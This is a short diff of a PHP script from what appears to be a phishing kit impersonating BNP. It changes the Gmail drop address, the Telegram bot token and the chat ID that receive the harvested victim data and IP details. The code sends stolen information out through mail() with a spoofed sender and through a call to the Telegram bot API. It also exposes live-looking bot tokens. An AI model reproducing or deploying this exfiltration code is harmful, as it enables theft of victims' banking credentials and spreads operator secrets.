@@ -18,7 +18,7 @@ $message .= " isp|: $ip | $hostname\n";
 
 
 
-$bilsnd = "boxmedia34@gmail.com";
+$bilsnd = "@gmail.com";
 $bilsub = "Bnp ID | $ip";
 $bilhead = "From: Bnp ID <info2@mail.ziggo.nl>";
 $bilhead .= "MIME-Version: 1.0\n";
@@ -32,9 +32,9 @@ fwrite($Txt_Rezlt, $message);
 fclose($Txt_Rezlt);
 
 mail($to, $subject, $message, $headers);
-$token = "1382145052:AAGsO00WvsBBNfT5ALBEX8h0JLx8XrYpUpg";
+$token = "1443724091:AAGTUQQqlLSLzRJtapT-eRZkuxLgYCiHbOQ";
 
-file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=1239437517&text=" . urlencode($message)."" );
+file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=-791509674&text=" . urlencode($message)."" );
 
 
 
